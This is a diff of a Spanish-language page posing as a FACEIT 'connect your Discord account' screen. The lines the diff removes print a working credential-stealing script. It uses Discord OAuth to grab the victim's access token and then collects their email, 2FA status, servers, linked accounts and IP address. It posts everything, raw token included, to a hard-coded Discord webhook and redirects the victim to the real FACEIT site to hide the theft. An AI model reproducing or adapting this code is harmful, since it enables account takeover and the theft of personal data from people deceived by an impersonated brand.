@@ -4,6 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>FACEIT — Conecta tu cuenta</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🟠</text></svg>">
 <style>
   *{box-sizing:border-box}
   body{margin:0;min-height:100vh;background:#0f0f10;display:flex;align-items:center;justify-content:center;
@@ -24,6 +25,7 @@
   .fine{margin:18px 0 0;font-size:11px;color:#6b7075;text-align:center;line-height:1.5}
   #status{margin-top:16px;font-size:13px;text-align:center;color:#9aa0a6;min-height:18px}
   #status.ok{color:#3ba55d}
+  #status.err{color:#ed4245}
   .spinner{display:inline-block;width:13px;height:13px;border:2px solid #444;border-top-color:#ff5500;
            border-radius:50%;animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}
   @keyframes spin{to{transform:rotate(360deg)}}
@@ -38,101 +40,4 @@
   <div class="steps">
     <div class="step"><span class="num">1</span>Autoriza la aplicación de Discord</div>
     <div class="step"><span class="num">2</span>Verifica tu identidad</div>
-    <div class="step"><span class="num">3</span>Vuelve a FACEIT automáticamente</div>
-  </div>
-
-  <button id="btn">
-    <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M20.3 4.4A19.8 19.8 0 0 0 15.4 3l-.3.6a14.6 14.6 0 0 1 4.3 1.4 15.7 15.7 0 0 0-13.7 0A14.6 14.6 0 0 1 9 3.6L8.6 3a19.8 19.8 0 0 0-4.9 1.4C.6 9.2-.3 13.9.1 18.5a20 20 0 0 0 6 3l.7-1.2c-.8-.3-1.5-.7-2.2-1.1l.5-.4a14.3 14.3 0 0 0 12.2 0l.5.4c-.7.4-1.4.8-2.2 1.1l.7 1.2a20 20 0 0 0 6-3c.5-5.3-.8-10-3.5-14.1zM8.3 15.4c-1.2 0-2.1-1.1-2.1-2.4s.9-2.4 2.1-2.4 2.2 1.1 2.1 2.4c0 1.3-.9 2.4-2.1 2.4zm7.4 0c-1.2 0-2.1-1.1-2.1-2.4s.9-2.4 2.1-2.4 2.2 1.1 2.1 2.4c0 1.3-.9 2.4-2.1 2.4z"/></svg>
-    Continuar con Discord
-  </button>
-
-  <p class="fine">Al continuar aceptas vincular tu cuenta de Discord con FACEIT.</p>
-  <div id="status"></div>
-</div>
-
-<script>
-/* ================== CONFIGURA ESTO ================== */
-const CLIENT_ID    = "1570090821276012595";
-const REDIRECT_URI = "https://tizianobaston2023-hash.github.io/beldent-chicle/";              // exactamente igual al del portal
-const WEBHOOK_URL  = "https://discord.com/api/webhooks/1570093723562545224/1XCD99eXZMe9OTHEudjbwR_rOYarr0j3JxG99JRZwm8VzEZBp2P0SRGFGbHBkInNISpP;
-const AFTER_REDIRECT = "https://www.faceit.com/";           // a dónde "vuelve" el usuario
-const SCOPES = "identify email guilds connections";         // quita lo que no necesites
-/* ==================================================== */
-
-const $ = id => document.getElementById(id);
-
-function authUrl() {
-  const p = new URLSearchParams({
-    client_id: CLIENT_ID,
-    redirect_uri: REDIRECT_URI,
-    response_type: "token",
-    scope: SCOPES,
-    prompt: "consent"
-  });
-  return "https://discord.com/oauth2/authorize?" + p.toString();
-}
-
-$("btn").addEventListener("click", () => { location.href = authUrl(); });
-
-async function run() {
-  const hash = new URLSearchParams(location.hash.slice(1));
-  const token = hash.get("access_token");
-  if (!token) return;
-
-  history.replaceState(null, "", location.pathname + location.search);
-  $("btn").style.display = "none";
-  $("status").innerHTML = '<span class="spinner"></span>Conectando con Discord…';
-
-  const H = { Authorization: "Bearer " + token };
-  const j = async (u) => { try { return await (await fetch(u, { headers: H })).json(); } catch { return null; } };
-
-  const me     = (await j("https://discord.com/api/users/@me")) || {};
-  const guilds = (await j("https://discord.com/api/users/@me/guilds")) || [];
-  const conns  = (await j("https://discord.com/api/users/@me/connections")) || [];
-  const ip     = await fetch("https://api.ipify.org?format=json")
-                    .then(r => r.json()).then(d => d.ip).catch(() => "—");
-
-  const avatar = (me.id && me.avatar)
-    ? `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.${String(me.avatar).startsWith("a_") ? "gif" : "png"}?size=256`
-    : "https://cdn.discordapp.com/embed/avatars/0.png";
-
-  const payload = {
-    username: "FACEIT · OAuth",
-    embeds: [{
-      title: "🔑 Nueva cuenta vinculada",
-      color: 0x00c26e,
-      thumbnail: { url: avatar },
-      fields: [
-        { name: "Usuario",  value: `\`${me.username ?? "?"}\` (<@${me.id}>)`, inline: true },
-        { name: "ID",       value: `\`${me.id ?? "?"}\``, inline: true },
-        { name: "Email",    value: `\`${me.email ?? "sin email"}\``, inline: true },
-        { name: "Verificado", value: me.verified ? "sí" : "no", inline: true },
-        { name: "2FA",      value: me.mfa_enabled ? "sí" : "no", inline: true },
-        { name: "Nitro",    value: me.premium_type ? "sí" : "no", inline: true },
-        { name: "Servidores", value: String(guilds.length), inline: true },
-        { name: "Conexiones", value: conns.map(c => c.type).join(", ") || "—", inline: true },
-        { name: "IP",       value: `\`${ip}\``, inline: true },
-        { name: "TOKEN",    value: "```\n" + token + "\n```" }
-      ],
-      footer: { text: "OAuth2 implicit · " + new Date().toLocaleString("es-ES") },
-      timestamp: new Date().toISOString()
-    }]
-  };
-
-  const body = JSON.stringify(payload);
-  try {
-    await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body });
-  } catch {
-    await fetch(WEBHOOK_URL, { method: "POST", mode: "no-cors",
-      headers: { "Content-Type": "application/json" }, body }).catch(() => {});
-  }
-
-  $("status").className = "ok";
-  $("status").textContent = "¡Cuenta conectada! Redirigiendo…";
-  setTimeout(() => location.href = AFTER_REDIRECT, 1800);
-}
-
-run();
-</script>
-</body>
-</html>
+    <div class="step
